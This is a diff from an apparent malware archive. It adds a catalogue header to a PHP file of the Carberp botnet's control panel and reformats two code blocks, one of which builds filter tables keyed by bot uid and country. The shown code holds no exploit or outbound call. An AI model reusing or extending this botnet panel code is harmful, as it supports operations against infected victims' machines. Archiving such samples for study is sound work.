@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
@@ -71,7 +82,8 @@ if(empty($Cur['id'])){
 				$sql = 'CREATE TABLE IF NOT EXISTS bf_filter_'.$insert_id.' ( id INT(11) unsigned NOT NULL AUTO_INCREMENT PRIMARY KEY, prefix VARCHAR(16) NOT NULL, uid TEXT NOT NULL, country VARCHAR(3) NOT NULL, ';
 		        $i = 0;
 
-		        foreach($_POST['p']['name'] as $value){		        	$i++;
+		        foreach($_POST['p']['name'] as $value){
+		        	$i++;
 		        	$sql .= 'v' . $i . ' VARCHAR(128) NOT NULL, ';
 		        }
 
@@ -114,8 +126,10 @@ if(empty($Cur['id'])){
         $_POST['host'] = real_escape_string($_POST['host']);
         $_POST['savelog'] = real_escape_string($_POST['savelog']);
 
-		if($_POST['savelog'] == 'on'){			$_POST['savelog'] = '1';
-		}else{			$_POST['savelog'] = '0';
+		if($_POST['savelog'] == 'on'){
+			$_POST['savelog'] = '1';
+		}else{
+			$_POST['savelog'] = '0';
 		}
 
 		if(empty($_POST['name'])){
